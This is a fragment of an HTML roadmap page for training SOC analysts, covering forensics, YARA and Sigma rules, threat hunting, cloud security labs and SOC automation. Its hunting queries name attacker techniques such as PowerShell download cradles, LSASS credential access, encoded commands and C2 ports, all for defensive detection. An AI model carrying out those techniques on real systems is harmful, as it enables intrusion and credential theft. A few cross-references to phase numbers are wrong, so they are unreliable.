+              <code>python3 vol.py -f memdump.raw windows.pslist</code> → running processes<br>
+              <code>python3 vol.py -f memdump.raw windows.pstree</code> → process tree<br>
+              <code>python3 vol.py -f memdump.raw windows.netstat</code> → network connections at time of dump<br>
+              <code>python3 vol.py -f memdump.raw windows.cmdline</code> → command-line arguments for each process<br>
+              <code>python3 vol.py -f memdump.raw windows.malfind</code> → injected/suspicious code regions<br>
+              Document all findings. Memory forensics reveals what anti-forensics and malware deletion can never hide.</div>
+              <div class="step-tools"><span class="stool">Volatility 3</span><span class="stool">pslist</span><span class="stool">netstat</span><span class="stool">malfind</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Disk imaging with FTK Imager</div>
+              <div class="step-desc">Download <a href="https://www.exterro.com/ftk-imager" target="_blank">FTK Imager</a> (free) on your Windows VM. Create a logical image of the C: drive: File → Create Disk Image → Logical Drive → select C: → output to E01 format. This is the standard forensic evidence format used in real investigations and law enforcement. Practice adding case information, examiner name, and evidence notes — the same fields used in real evidence documentation.</div>
+              <div class="step-tools"><span class="stool">FTK Imager</span><span class="stool">E01 Format</span><span class="stool">Chain of Custody</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">4</div>
+            <div class="step-content">
+              <div class="step-title">Disk forensics with Autopsy</div>
+              <div class="step-desc">Download <a href="https://www.autopsy.com/download/" target="_blank">Autopsy</a> (free, open source). Create a new case, add your FTK disk image as a data source. Explore: deleted files (recycle bin + unallocated space), browser history, recently accessed documents, prefetch files (program execution evidence), Windows Event Logs, registry hives, and the filesystem timeline. Export findings as a report. This is what DFIR teams do to reconstruct what happened on a compromised host.</div>
+              <div class="step-tools"><span class="stool">Autopsy</span><span class="stool">Deleted File Recovery</span><span class="stool">Timeline Analysis</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">5</div>
+            <div class="step-content">
+              <div class="step-title">Write YARA rules for malware detection</div>
+              <div class="step-desc">YARA rules are used by EDR tools, SIEMs, and IR teams to identify malware based on patterns. Write 5 YARA rules using malware samples from MalwareBazaar:<br>
+              1. A rule matching a specific string sequence (hardcoded C2 URL or registry key)<br>
+              2. A rule matching PE import hashes (IAT-based detection)<br>
+              3. A rule matching packed or high-entropy sections<br>
+              4. A rule matching Base64-encoded PowerShell patterns<br>
+              5. A rule combining multiple conditions with AND/OR logic<br>
+              Test with: <code>yara -r your_rule.yar /path/to/scan</code>. Publish all rules to GitHub with documentation.</div>
+              <div class="step-tools"><span class="stool">YARA</span><span class="stool">MalwareBazaar</span><span class="stool">Pattern Matching</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">6</div>
+            <div class="step-content">
+              <div class="step-title">Write a digital forensics investigation report</div>
+              <div class="step-desc">For your memory and disk analysis produce a formal DFIR report: Case Summary, Evidence Collected (with hashes for chain of custody), Analysis Methodology, Key Findings (timeline of events, artifacts discovered, IOCs), Conclusions, and Recommendations. This is the exact format used in real incident investigations and legal proceedings. Publish to GitHub.</div>
+            </div>
+          </div>
+        </div>
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I performed memory forensics using Volatility — running processes, network connections, command-line arguments, and injected code detection. I imaged a disk with FTK Imager in E01 format and analyzed it with Autopsy, recovering deleted files and building a filesystem timeline. I also wrote five YARA rules for malware pattern detection and produced a formal DFIR investigation report."
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Memory dump acquired and analyzed in Volatility. Disk image created in FTK and analyzed in Autopsy. 5 YARA rules published. Full DFIR report on GitHub. L2 and IR analyst roles are now within reach.</div>
+      </div>
+    </div>
+<!-- PHASE 16 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">16</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Threat Hunting</div>
+          <div class="phase-hdr-meta">Hypothesis-driven hunting · Sigma rules · ATT&CK Navigator · ~3 hours</div>
+          <div class="phase-tags"><span class="ptag">KQL Hunting</span><span class="ptag">LOLBins</span><span class="ptag">C2 Detection</span><span class="ptag">Sigma Rules</span><span class="ptag">ATT&CK</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Threat hunting is proactive — you go looking for threats before an alert fires. It's what separates L2 analysts from L1. Start learning it now.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Write and run 7 threat hunt queries in Kibana</div>
+              <div class="step-desc">
+              <strong>Hunt 1 — Unusual parent-child:</strong> <code>process.name: cmd.exe AND process.parent.name: winword.exe</code> — Word spawning cmd is malicious<br>
+              <strong>Hunt 2 — PowerShell download cradles:</strong> <code>process.command_line: (*DownloadString* OR *WebClient* OR *Invoke-Expression*)</code><br>
+              <strong>Hunt 3 — LSASS readers:</strong> <code>winlog.event_data.TargetImage: *lsass.exe AND NOT process.name: (MsMpEng.exe OR svchost.exe)</code><br>
+              <strong>Hunt 4 — Common C2 ports:</strong> <code>destination.port: (4444 OR 1337 OR 8888 OR 9999)</code><br>
+              <strong>Hunt 5 — DNS tunneling:</strong> <code>dns.question.type: TXT AND dns.question.name.length > 50</code><br>
+              <strong>Hunt 6 — New services:</strong> <code>event.code: 7045</code> — check binary path for suspicious locations<br>
+              <strong>Hunt 7 — Encoded commands:</strong> <code>process.command_line: (*-enc* OR *-EncodedCommand*)</code><br><br>
+              Document each hunt: hypothesis → query → findings → verdict. If a hunt finds something real, promote it to a detection rule.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Write Sigma rules for your top detections</div>
+              <div class="step-desc">Sigma is a vendor-neutral detection format that converts to Elastic, Splunk, Sentinel, or any SIEM. Go to <a href="https://github.com/SigmaHQ/sigma" target="_blank">github.com/SigmaHQ/sigma</a> and read the format documentation. Write Sigma rules for: encoded PowerShell, LSASS access, certutil download, and WMI execution. Use sigma-cli to convert them to Kibana format. Publish all rules to your GitHub portfolio — this is a strong differentiator.</div>
+              <div class="step-tools"><span class="stool">Sigma</span><span class="stool">sigma-cli</span><span class="stool">GitHub</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Build an ATT&CK Navigator heatmap</div>
+              <div class="step-desc">Go to <a href="https://mitre-attack.github.io/attack-navigator/" target="_blank">mitre-attack.github.io/attack-navigator</a>. Map every attack you've simulated and every detection rule you've written to an ATT&CK technique. Color-code them (detected = green, simulated but not detected = yellow). Export the heatmap and add it to your GitHub portfolio. This visually shows your detection coverage.</div>
+              <div class="step-tools"><span class="stool">ATT&CK Navigator</span><span class="stool">MITRE ATT&CK</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>7 hunt queries documented. 4 Sigma rules published to GitHub. ATT&CK Navigator heatmap built.</div>
+      </div>
+    </div>
+
+            <!-- TRACK 5 DIVIDER -->
+    <div class="track-divider" style="border-left-color:var(--accent2)">
+      <div class="track-divider-icon">🌐</div>
+      <div>
+        <div class="track-divider-title">Track 5 — Online Platform Practice</div>
+        <div class="track-divider-sub">LetsDefend · CyberDefenders · BTLO — real cases, real artifacts, real SOC scenarios.</div>
+      </div>
+    </div>
+<!-- PHASE 17 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">17</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">LetsDefend — Work a Real SOC Alert Queue</div>
+          <div class="phase-hdr-meta">Free · browser-based · 30+ cases · ongoing</div>
+          <div class="phase-tags"><span class="ptag g">Free</span><span class="ptag">Alert Triage</span><span class="ptag">Case Management</span><span class="ptag">SOC Workflow</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">LetsDefend is the closest thing to sitting in a real SOC without having a job. You work a live alert queue, investigate cases, and close tickets — exactly like a T1 analyst does.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Create a free account and start working cases</div>
+              <div class="step-desc">Go to <a href="https://letsdefend.io" target="_blank">letsdefend.io</a> → create free account → Monitoring → EventLog → open any alert. For every IP you see: check <a href="https://www.abuseipdb.com" target="_blank">AbuseIPDB</a> and VirusTotal. For every domain: check URLScan.io. Decide: True Positive or False Positive — and write exactly WHY in the case notes. Close the case with your decision. Do this for every alert.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Complete these specific cases first</div>
+              <div class="step-desc">SOC165 — Web attack investigation<br>SOC109 — Phishing email triage<br>SOC104 — Malware detection and investigation<br>SOC114 — Ransomware detection<br><br>These 4 cases cover the most common alert types you'll see in a real L1 SOC role. Apply your runbooks from Phase 4 to each one.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">3</div>
+            <div class="step-content">
+              <div class="step-title">Write professional case notes on every single closure</div>
+              <div class="step-desc">Every case you close needs: alert summary → investigation steps → IOC lookup results → decision and why → action taken. This is the skill that separates someone who can triage from someone who can communicate. Hiring managers ask to see case notes. Have good ones.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>30+ cases closed with professional written notes. Accuracy rate tracked and reviewed.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 18 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">18</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">CyberDefenders — Full Investigation Labs</div>
+          <div class="phase-hdr-meta">Free · real artifacts · write full reports · ongoing</div>
+          <div class="phase-tags"><span class="ptag g">Free</span><span class="ptag">DFIR</span><span class="ptag">PCAP Analysis</span><span class="ptag">Threat Hunting</span><span class="ptag">Incident Reports</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">CyberDefenders gives you real artifacts — PCAPs, log files, disk images — and asks you to investigate an incident. These are the strongest portfolio pieces you can produce.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Complete these 6 labs in order</div>
+              <div class="step-desc">Go to <a href="https://cyberdefenders.org" target="_blank">cyberdefenders.org</a> → create free account → complete in this order:<br><br>
+              1. <strong>PsExec Hunt</strong> — lateral movement via network and endpoint logs<br>
+              2. <strong>PacketMaze</strong> — DNS and HTTP traffic analysis<br>
+              3. <strong>Tomcat Takeover</strong> — web server attack forensics<br>
+              4. <strong>OpenWire</strong> — C2 traffic identification<br>
+              5. <strong>Graboid</strong> — container security investigation<br>
+              6. <strong>Insider</strong> — insider threat investigation<br><br>
+              For each: download all case files, work through every question, write a full incident report. Publish every report to GitHub.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>6 labs completed. 6 incident reports published to GitHub.</div>
+      </div>
+    </div>
+
+            <!-- PHASE 19 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-green">19</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Blue Team Labs Online — Scenario Investigations</div>
+          <div class="phase-hdr-meta">Free tier · IR-focused scenarios · 5 labs · real artifacts</div>
+          <div class="phase-tags"><span class="ptag g">Free</span><span class="ptag">DFIR</span><span class="ptag">IR Scenarios</span><span class="ptag">Blue Team</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">BTLO (Blue Team Labs Online) is more IR-scenario-focused than LetsDefend and more beginner-friendly than CyberDefenders. It sits perfectly between the two and rounds out your online platform experience. Many scenarios provide real log files, PCAPs, and artifacts to investigate directly.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-green">1</div>
+            <div class="step-content">
+              <div class="step-title">Create a free BTLO account and complete 5 scenarios</div>
+              <div class="step-desc">Go to <a href="https://blueteamlabs.online" target="_blank">blueteamlabs.online</a> → create a free account → Investigations section. Complete these scenario types in order:<br>
+              1. A <strong>phishing email analysis</strong> scenario<br>
+              2. A <strong>log analysis</strong> scenario<br>
+              3. A <strong>PCAP / network forensics</strong> scenario<br>
+              4. A <strong>malware analysis</strong> scenario<br>
+              5. A <strong>memory forensics</strong> scenario (using Volatility — apply what you learned in Phase 17)<br>
+              Write a 1-paragraph investigation summary for each. Publish all 5 to GitHub.</div>
+              <div class="step-tools"><span class="stool">BTLO</span><span class="stool">Multi-source Investigation</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-green">2</div>
+            <div class="step-content">
+              <div class="step-title">Compare your investigation workflow across all 3 platforms</div>
+              <div class="step-desc">After completing BTLO, write a short comparison: LetsDefend (alert queue / triage focus), CyberDefenders (artifact-heavy full investigations), BTLO (IR scenario and forensics focus). Note which types of questions each platform asks and what skills each sharpens. Publish to GitHub. Being able to speak about multiple practice platforms in an interview signals sustained, deliberate training.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>5 BTLO scenarios completed. All investigation summaries published to GitHub. You have now completed 3 real-world SOC practice platforms — LetsDefend, CyberDefenders, and BTLO.</div>
+      </div>
+    </div>
+    <!-- TRACK 6 DIVIDER -->
+    <div class="track-divider" style="border-left-color:var(--accent3)">
+      <div class="track-divider-icon">☁️</div>
+      <div>
+        <div class="track-divider-title">Track 6 — Cloud SOC</div>
+        <div class="track-divider-sub">AWS + Azure + Microsoft Defender for Endpoint — the biggest differentiator against candidates without cloud or EDR experience.</div>
+      </div>
+    </div>
+<!-- PHASE 20 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-orange">20</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">AWS CloudTrail + GuardDuty + Security Hub</div>
+          <div class="phase-hdr-meta">Free tier · cloud threat detection · misconfiguration triage</div>
+          <div class="phase-tags"><span class="ptag o">AWS Free Tier</span><span class="ptag">CloudTrail</span><span class="ptag">GuardDuty</span><span class="ptag">Security Hub</span><span class="ptag">IAM</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Cloud SOC is where the market is moving. AWS CloudTrail and GuardDuty are the equivalent of Sysmon and your SIEM in cloud environments. This is all free tier.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-orange">1</div>
+            <div class="step-content">
+              <div class="step-title">Enable CloudTrail and GuardDuty on a free AWS account</div>
+              <div class="step-desc">Create a free AWS account at <a href="https://aws.amazon.com" target="_blank">aws.amazon.com</a>. Enable CloudTrail: search CloudTrail → Create Trail → all regions → new S3 bucket. Enable GuardDuty: search GuardDuty → Get Started → Enable. Now simulate suspicious activity: create an IAM user → generate access keys → delete them. Try accessing a resource without permissions. Disable CloudTrail logging then re-enable it. Check GuardDuty Findings — see what triggered. Check CloudTrail Event History — read the raw API events.</div>
+              <div class="step-tools"><span class="stool">AWS CloudTrail</span><span class="stool">GuardDuty</span><span class="stool">IAM</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-orange">2</div>
+            <div class="step-content">
+              <div class="step-title">Detect cloud misconfigurations with Security Hub</div>
+              <div class="step-desc">Enable Security Hub → enable the CIS AWS Foundations Benchmark standard. Review your failed controls. Intentionally create misconfigurations and confirm Security Hub catches them: make an S3 bucket public → Security Hub fires. Give an IAM user AdministratorAccess → flagged. Remove MFA from root account → flagged as critical. Remediate each one → confirm finding resolves. Write a cloud misconfiguration report for each.</div>
+              <div class="step-tools"><span class="stool">AWS Security Hub</span><span class="stool">S3</span><span class="stool">IAM</span><span class="stool">CIS Benchmark</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>CloudTrail and GuardDuty live. 4+ findings generated and investigated. 3 misconfigurations detected and remediated.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 21 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-orange">21</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Microsoft Sentinel — Second Cloud SIEM</div>
+          <div class="phase-hdr-meta">Azure free tier · KQL · analytic rules · incident triage</div>
+          <div class="phase-tags"><span class="ptag o">Azure Free</span><span class="ptag">Sentinel</span><span class="ptag">KQL</span><span class="ptag">Analytic Rules</span><span class="ptag">Incidents</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Many enterprise SOCs use Microsoft Sentinel. Learning it alongside Elastic doubles your job opportunities. The good news: KQL in Sentinel is nearly identical to Kibana KQL — you already know most of it.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-orange">1</div>
+            <div class="step-content">
+              <div class="step-title">Deploy Sentinel and connect data sources</div>
+              <div class="step-desc">Create a free Azure account at <a href="https://portal.azure.com" target="_blank">portal.azure.com</a>. Search Microsoft Sentinel → Create → create a new Log Analytics Workspace. Add Sentinel to the workspace. Go to Data Connectors and enable: Azure Activity (all Azure management operations) and Microsoft Entra ID (sign-in and audit logs). Go to Logs and write your first query: <code>SecurityEvent | where EventID == 4625 | summarize count() by Account</code>.</div>
+              <div class="step-tools"><span class="stool">Microsoft Sentinel</span><span class="stool">Log Analytics</span><span class="stool">KQL</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-orange">2</div>
+            <div class="step-content">
+              <div class="step-title">Build custom analytic rules and triage incidents</div>
+              <div class="step-desc">In Sentinel → Analytics → Rule Templates → enable: Failed Login Attempts, New Admin User, Rare Subscription Operations. Create a custom rule: Multiple Failed Logins from Same IP using KQL with a threshold. Go to Incidents → work the alerts your rules generate. Compare the Sentinel triage workflow to your Elastic SIEM experience. Write a comparison document: Sentinel vs Elastic — query syntax differences, alert workflow, dashboard capabilities. Publish it to GitHub.</div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Sentinel deployed. 3 custom rules built. 5+ incidents triaged. Sentinel vs Elastic comparison published to GitHub.</div>
+      </div>
+    </div>
+
+            <!-- PHASE 22 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-orange">22</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Microsoft Defender for Endpoint</div>
+          <div class="phase-hdr-meta">Free M365 E5 dev tenant · EDR · Advanced Hunting · KQL · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag o">Enterprise EDR</span><span class="ptag">MDE</span><span class="ptag">Advanced Hunting</span><span class="ptag">KQL</span><span class="ptag">Defender XDR</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro"><strong style="color:var(--accent2)">Why this matters:</strong> Microsoft Defender for Endpoint is one of the most widely deployed EDR platforms on the planet. MDE + Microsoft Sentinel is the full cloud-native SOC stack used by thousands of enterprises. You already know Sentinel from Phase 24. Adding MDE closes the last major technical gap — enterprise EDR hands-on experience — and brings your SOC L1 readiness from 85% to 93%+.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-orange">1</div>
+            <div class="step-content">
+              <div class="step-title">Get a free Microsoft 365 E5 developer tenant</div>
+              <div class="step-desc">Go to <a href="https://developer.microsoft.com/en-us/microsoft-365/dev-program" target="_blank">developer.microsoft.com/en-us/microsoft-365/dev-program</a> → Join Now → set up your free E5 sandbox tenant. This gives you 25 E5 licenses, full access to Microsoft Defender for Endpoint, Microsoft Sentinel, Defender XDR, Purview, and more — completely free. The tenant auto-renews for active developers. This is a $50,000+/year enterprise product accessible at zero cost.</div>
+              <div class="step-tools"><span class="stool">M365 E5</span><span class="stool">Developer Tenant</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-orange">2</div>
+            <div class="step-content">
+              <div class="step-title">Onboard your Windows VM to MDE</div>
+              <div class="step-desc">In the Microsoft Defender portal (security.microsoft.com) → Settings → Endpoints → Onboarding → download the onboarding script for Windows 10. Run it on your Windows VM as Administrator. The VM will appear in Devices within a few minutes. This is the exact onboarding workflow used by enterprise security teams deploying MDE to thousands of endpoints.</div>
+              <div class="step-tools"><span class="stool">MDE Onboarding</span><span class="stool">Defender Portal</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-orange">3</div>
+            <div class="step-content">
+              <div class="step-title">Explore the Device Timeline and Alerts</div>
+              <div class="step-desc">Click your Windows device → Device Timeline. Generate activity: run PowerShell, create files, make network connections, run nmap from Kali against it. Review the device timeline — MDE shows every process, network connection, file event, and login in chronological order. This is the single most powerful investigation view in an enterprise SOC. Compare it to your Kibana/Sysmon timeline. Run some attack simulations and review the resulting alerts in the Incidents queue.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-orange">4</div>
+            <div class="step-content">
+              <div class="step-title">Advanced Hunting with KQL</div>
+              <div class="step-desc">Go to Hunting → Advanced Hunting. Run these queries:<br>
+              <code>DeviceProcessEvents | where FileName == "powershell.exe" | project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine</code><br>
+              <code>DeviceNetworkEvents | where RemotePort in (4444, 1337, 8888) | project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName</code><br>
+              <code>DeviceLogonEvents | where ActionType == "LogonFailed" | summarize count() by AccountName, DeviceName</code><br>
+              This is the same KQL you know from Elastic and Sentinel — same language, different table names. Write 5 custom hunting queries and save them. Publish to GitHub.</div>
+              <div class="step-tools"><span class="stool">Advanced Hunting</span><span class="stool">KQL</span><span class="stool">DeviceProcessEvents</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-orange">5</div>
+            <div class="step-content">
+              <div class="step-title">Connect MDE to Sentinel and write a 3-platform comparison</div>
+              <div class="step-desc">In your Sentinel workspace add the Microsoft Defender XDR data connector. Now your MDE alerts flow into Sentinel alongside your AWS data. Run a KQL query in Sentinel against MDE events. Then write a 3-platform SIEM/EDR comparison: Elastic SIEM + Wazuh + MDE/Sentinel. Cover: deployment model, data ingestion, alerting, threat hunting, ATT&CK mapping, and enterprise use cases. Publish to GitHub. This comparison document alone will make you stand out in every SOC interview you walk into.</div>
+              <div class="step-tools"><span class="stool">Microsoft Sentinel</span><span class="stool">Defender XDR Connector</span><span class="stool">KQL</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="phase-intro" style="margin:0 18px 18px;padding:14px 16px;background:rgba(255,107,53,.04);border:1px solid rgba(255,107,53,.15);border-radius:8px;border-bottom:none;font-style:italic">
+          <strong style="color:var(--accent3);font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-style:normal">INTERVIEW TRANSLATION</strong><br><br>
+          "I have hands-on experience with Microsoft Defender for Endpoint — device onboarding, alert investigation, device timeline analysis, and Advanced Hunting with KQL. I connected MDE to Microsoft Sentinel and ran cross-platform investigations. I can also compare MDE, Elastic SIEM, and Wazuh across deployment model, alerting, and threat hunting workflows."
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Windows VM onboarded to MDE. Alerts investigated. 5 Advanced Hunting queries published. 3-platform comparison document on GitHub. SOC L1 readiness: 93%+.</div>
+      </div>
+    </div>
+    <!-- TRACK 7 DIVIDER -->
+    <div class="track-divider" style="border-left-color:#b464ff">
+      <div class="track-divider-icon">🐍</div>
+      <div>
+        <div class="track-divider-title">Track 7 — L2 SOC Skills</div>
+        <div class="track-divider-sub">Python · SOAR · Splunk — targeting the $85–114K roles.</div>
+      </div>
+    </div>
+<!-- PHASE 23 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-purple">23</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Python Automation for SOC</div>
+          <div class="phase-hdr-meta">3 automation scripts · VirusTotal API · IOC enrichment</div>
+          <div class="phase-tags"><span class="ptag p">L2 Skill</span><span class="ptag">Python</span><span class="ptag">VirusTotal API</span><span class="ptag">Automation</span><span class="ptag">Log Parsing</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Every L2 SOC job posting asks for Python. You don't need to be a developer — you need to write scripts that automate repetitive SOC tasks like IOC lookups, log parsing, and alert enrichment.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-purple">1</div>
+            <div class="step-content">
+              <div class="step-title">Learn Python basics (3–4 days)</div>
+              <div class="step-desc">Install Python from <a href="https://python.org" target="_blank">python.org</a> and VS Code from <a href="https://code.visualstudio.com" target="_blank">code.visualstudio.com</a>. Learn these fundamentals: variables, strings, lists, dictionaries, for loops, if statements, functions, reading files, and the requests library. Use <a href="https://learnpython.org" target="_blank">learnpython.org</a> — it's free and browser-based. Don't spend more than 4 days on basics before moving to real scripts.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-purple">2</div>
+            <div class="step-content">
+              <div class="step-title">Build 3 SOC automation scripts</div>
+              <div class="step-desc">
+              <strong>Script 1 — IP enrichment:</strong> takes an IP as input → queries VirusTotal API → prints malicious vote count and categories. Get your free API key at virustotal.com → account settings.<br><br>
+              <strong>Script 2 — Bulk IOC checker:</strong> reads a list of IPs from a text file → checks each against VirusTotal → outputs a CSV with results. Saves hours of manual lookup work.<br><br>
+              <strong>Script 3 — Log parser:</strong> reads a Windows event log export → extracts all failed login IPs → outputs them sorted by frequency. Shows you the top brute force sources at a glance.<br><br>
+              Add error handling (try/except) to each script. Add comments. Publish all 3 to GitHub with README files explaining what each one does.</div>
+              <div class="step-tools"><span class="stool">Python</span><span class="stool">VS Code</span><span class="stool">VirusTotal API</span><span class="stool">requests library</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>3 working Python scripts published to GitHub. You can automate IOC lookups without manual effort.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 24 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-purple">24</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">SOAR + Splunk</div>
+          <div class="phase-hdr-meta">Shuffle SOAR · automated playbooks · Splunk SPL · free</div>
+          <div class="phase-tags"><span class="ptag p">L2 Skill</span><span class="ptag">Shuffle SOAR</span><span class="ptag">Playbooks</span><span class="ptag">Splunk</span><span class="ptag">SPL</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">SOAR automates SOC response playbooks. Splunk is used by many enterprise SOCs and MSSPs alongside or instead of Elastic. Knowing both makes you more hireable.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-purple">1</div>
+            <div class="step-content">
+              <div class="step-title">Build 2 automated playbooks in Shuffle SOAR</div>
+              <div class="step-desc">Go to <a href="https://shuffler.io" target="_blank">shuffler.io</a> → create a free account. Shuffle is open-source SOAR — free and beginner-friendly.<br><br>
+              <strong>Playbook 1 — IP enrichment:</strong> Trigger: webhook receives alert with an IP → Step 1: query VirusTotal API → Step 2: query AbuseIPDB → Step 3: if score > 5 → send email alert with results.<br><br>
+              <strong>Playbook 2 — Phishing triage:</strong> Trigger: email received in monitored inbox → Step 1: extract URLs from body → Step 2: check each in VirusTotal → Step 3: if malicious → block sender and notify analyst.<br><br>
+              Document both with screenshots in your GitHub portfolio.</div>
+              <div class="step-tools"><span class="stool">Shuffle SOAR</span><span class="stool">VirusTotal API</span><span class="stool">AbuseIPDB API</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-purple">2</div>
+            <div class="step-content">
+              <div class="step-title">Learn Splunk SPL and build detections</div>
+              <div class="step-desc">Download <a href="https://www.splunk.com/en_us/download/splunk-enterprise.html" target="_blank">Splunk Enterprise free trial</a> (up to 500MB/day — enough for lab use). Import Windows event logs from your lab. Learn these core SPL commands:<br>
+              <code>index=main sourcetype=WinEventLog | stats count by EventCode</code><br>
+              <code>index=main EventCode=4625 | stats count by src_ip | sort -count</code><br>
+              <code>index=main EventCode=4688 CommandLine=*-enc* | table _time, host, CommandLine</code><br><br>
+              Build 3 Splunk dashboards matching your Kibana ones. Create 3 detection alerts. Complete the TryHackMe Splunk rooms to reinforce. Write a Splunk vs Elastic comparison document and publish to GitHub.</div>
+              <div class="step-tools"><span class="stool">Splunk Enterprise</span><span class="stool">SPL</span><span class="stool">TryHackMe</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>2 SOAR playbooks built. Splunk installed with dashboards and alerts. Comparison document published.</div>
+      </div>
+    </div>
+
+            <!-- TRACK 8 DIVIDER -->
+    <div class="track-divider" style="border-left-color:var(--accent3)">
+      <div class="track-divider-icon">🎯</div>
+      <div>
+        <div class="track-divider-title">Track 8 — Land the Job</div>
+        <div class="track-divider-sub">Portfolio · LinkedIn · Interview prep — the final mile.</div>
+      </div>
+    </div>
+<!-- PHASE 25 -->
+    <div class="phase-block">
